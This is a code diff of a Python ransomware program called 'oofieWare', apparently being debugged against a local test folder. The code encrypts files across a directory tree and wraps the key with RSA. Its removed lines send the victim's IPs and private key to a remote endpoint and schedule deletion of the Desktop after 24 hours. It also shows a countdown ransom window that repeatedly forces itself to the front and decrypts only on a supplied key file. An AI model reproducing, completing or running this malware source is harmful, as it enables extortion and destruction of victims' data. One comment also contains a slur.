@@ -1,6 +1,8 @@
 import os
 import subprocess
 import shutil
+from pathlib import Path
+import pygetwindow as pg
 import threading
 import socket
 import base64
@@ -21,11 +23,13 @@ class oofieWare:
         self.key = None
         self.enc_key = None
         self.encrypter = None
-        self.decrypter = None
+        self.decrypter = None # Fernet(b'71CcgzEi0it8IQVpFkqjPyZxcckbN8VYnTBL2VQnoDg=')
+        self.threads = []
         self.ransomWindow = None
         self.started = False
-        self.startPoint = os.path.expanduser("~")
-        # self.Desktop = os.path.normpath(os.path.expanduser("~/Desktop"))
+        self.startPoint = r'C:\Users\yaokh\Desktop\Target'
+        # self.startPoint = os.path.expanduser("~")
+        self.Desktop = os.path.normpath(os.path.expanduser("~/Desktop"))
         self.LARGE_SIZE = 50_000_000
         self.PUBLIC_IP = requests.get('https://api.ipify.org').text
         self.PRIVATE_IP = socket.gethostbyname(socket.gethostname())
@@ -54,38 +58,46 @@ class oofieWare:
 
         self.key = base64.urlsafe_b64encode(kdf.derive(secure_pw))
         self.encrypter = Fernet(self.key)
+        print(self.key)
 
     def gen_rsa_keypair(self):
         keyPair = RSA.generate(4096)
         self.privKey = keyPair.export_key()
         self.pubKey = keyPair.publickey()
-        requests.post(self.ENDPOINT, data=json.dumps({
-            "PUBLIC_IP": self.PUBLIC_IP,
-            "PRIVATE_IP": self.PRIVATE_IP,
-            "PRIVATE_KEY": self.privKey
-        }), headers={"Content-Type" : "application/json"})
+        # requests.post(self.ENDPOINT, data=json.dumps({
+        #     "PUBLIC_IP": self.PUBLIC_IP,
+        #     "PRIVATE_IP": self.PRIVATE_IP,
+        #     "PRIVATE_KEY": self.privKey
+        # }), headers={"Content-Type" : "application/json"})
         self.privKey = None
 
     def crypt_file(self, file_path):
-        if self.encrypter:
-            with open(file_path, 'rb') as x:
-                data = x.read()
-                enc_data = self.encrypter.encrypt(data)
-                x.close()
+        try:
+            if self.encrypter:
+                enc_data = None
+                with open(file_path, 'rb') as x:
+                    data = x.read()
+                    if data:
+                        enc_data = self.encrypter.encrypt(data)
+                        x.close()
+                if enc_data:
+                    with open(file_path, "wb") as y:
+                        y.write(enc_data)
+                        y.close()
 
-            with open(file_path, "wb") as y:
-                y.write(enc_data)
-                y.close()
-
-        if self.decrypter:
-            with open(file_path, 'rb') as x:
-                data = x.read()
-                dec_data = self.decrypter.decrypt(data)
-                x.close()
-
-            with open(file_path, "wb") as y:
-                y.write(dec_data)
-                y.close()
+            if self.decrypter:
+                dec_data = None
+                with open(file_path, 'rb') as x:
+                    data = x.read()
+                    if data:
+                        dec_data = self.decrypter.decrypt(data)
+                        x.close()
+                if dec_data:
+                    with open(file_path, "wb") as y:
+                        y.write(dec_data)
+                        y.close()
+        except Exception as e:
+            print(f"Error detected at {file_path}\n {e}")
 
     def crypt_system(self):
         for root, dirs, files in os.walk(self.startPoint, topdown = True):
@@ -94,16 +106,32 @@ class oofieWare:
                 if not (os.stat(file_path).st_size > self.LARGE_SIZE):
                     self.crypt_file(file_path)
                 else:
-                    threading.Thread(target=self.crypt_file, args=(file_path)).start()
-        self.encrypter = None
+                    t = threading.Thread(target=self.crypt_file, args=(file_path,))
+                    self.threads.append(t)
+                    t.start()
+        # self.encrypter = None
 
-    def enc_key(self):
+    def wait_till_finish(self):
+        for thr in self.threads:
+            thr.join()
+
+    def encrypt_key(self):
+        print("entered enc func")
+        self.encrypter = None
         enc_for_key = PKCS1_OAEP.new(self.pubKey)
+        print("created enc for key")
         self.enc_key = enc_for_key.encrypt(self.key)
+        print("created enc key")
         self.key = None
+        print("del key")
         with open (f"{self.Desktop}/IDENTIFIER.TXT", "wb") as id:
             id.write(self.enc_key)
             id.close()
+
+    def show_sym_key(self):
+        with open(r'C:\Users\yaokh\Desktop\Target\sym_key.txt', 'wb') as home:
+            home.write(self.key)
+            home.close()
 
     def show_ransom_window(self):
 
@@ -184,7 +212,7 @@ class oofieWare:
                     minute = 59
                     second = 59
                 window.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second)) 
-
+        
         logoFrame = tk.Frame(bg='#000000')
         frame1 = tk.Frame(bg="#000000")
         frame2 = tk.Frame(bg="#000000")
@@ -206,41 +234,57 @@ class oofieWare:
 
         countdown("24:00:00")
 
-        eraseTimer = threading.Timer(60*60*24, self.erase_system)
+        # eraseTimer = threading.Timer(60*60*24, self.erase_system)
 
-        eraseTimer.start()
+        # eraseTimer.start()
 
         self.ransomWindow = window
         window.mainloop()
 
-    def erase_system(self):
-        for root, dirs, files in os.walk(self.Desktop, topdown = True):
-            try:
-                shutil.rmtree(os.path.join(root, dirs))
-            except OSError as e:
-                pass
+    # def erase_system(self):
+    #     for root, dirs, files in os.walk(self.Desktop, topdown = True):
+    #         try:
+    #             shutil.rmtree(os.path.join(root, dirs))
+    #         except OSError as e:
+    #             pass
             
     def elevate_ransom_window(self):
 
-        def getForegroundWindowTitle() -> Optional[str]:
-            hWnd = windll.user32.GetForegroundWindow()
-            length = windll.user32.GetWindowTextLengthW(hWnd)
-            buf = create_unicode_buffer(length + 1)
-            windll.user32.GetWindowTextW(hWnd, buf, length + 1)
+        # def getForegroundWindowTitle() -> Optional[str]:
+        #     hWnd = windll.user32.GetForegroundWindow()
+        #     length = windll.user32.GetWindowTextLengthW(hWnd)
+        #     buf = create_unicode_buffer(length + 1)
+        #     windll.user32.GetWindowTextW(hWnd, buf, length + 1)
 
         while True:
-            if not (getForegroundWindowTitle() == 'Ransom Note'):
-                if self.ransomWindow:
-                    self.ransomWindow.lift()
+            topWindow = pg.getActiveWindow()
+            if topWindow.title != "Ransom Note":
+                try:
+                    print("activated")
+                    win = pg.getWindowsWithTitle('Ransom Note')[0]
+                    win.minimize()
+                    win.restore()
+                except:
+                    continue
+            else:
+                print("is top window")
+
+            sleep(5)
 
     def detect_dec_key(self):
+        DECRYPT_FILE_PATH = Path(fr"{self.Desktop}/DECRYPT.txt")
         while True:
             try:
-                with open(f"{self.Desktop}/DECRYPT.txt", "rb") as dec:
-                    self.key = dec.read()
-                    self.decrypter = Fernet(self.key)
-                    self.crypt_system()
-                    break
+                if DECRYPT_FILE_PATH.is_file():
+                    try:
+                        with open(f"{self.Desktop}/DECRYPT.txt", "rb") as dec:
+                            self.key = dec.read()
+                            self.decrypter = Fernet(self.key)
+                            print("Decrypting...")
+                            self.crypt_system()
+                            break
+                    except Exception as e:
+                        print("Incorrect decryption key given.")
 
             except Exception as e:
                 pass
@@ -249,15 +293,22 @@ class oofieWare:
 
 def attack():
     oof = oofieWare(gen_rsa = True)
-    oof.gen_sym_key()
-    oof.gen_rsa_keypair()
-    oof.crypt_system()
-    oof.enc_key()
+    # oof.gen_sym_key()
+    # oof.gen_rsa_keypair()
+    # oof.crypt_system()
+    # oof.show_sym_key()
+    # oof.wait_till_finish()
+    # oof.encrypt_key()
     elevate = threading.Thread(target = oof.elevate_ransom_window)
     elevate.start()
-    detect = threading.Thread(target = oof.detect_dec_key)
-    detect.start()
+    # detect = threading.Thread(target = oof.detect_dec_key)
+    # detect.start()
     oof.show_ransom_window()
     
+attack()
+    
+# DONT be a retard and run this by accident
 
 # print(oofieWare().startPt())
+
+# print(os.listdir(r'C:\Users\yaokh\Desktop\Target'))
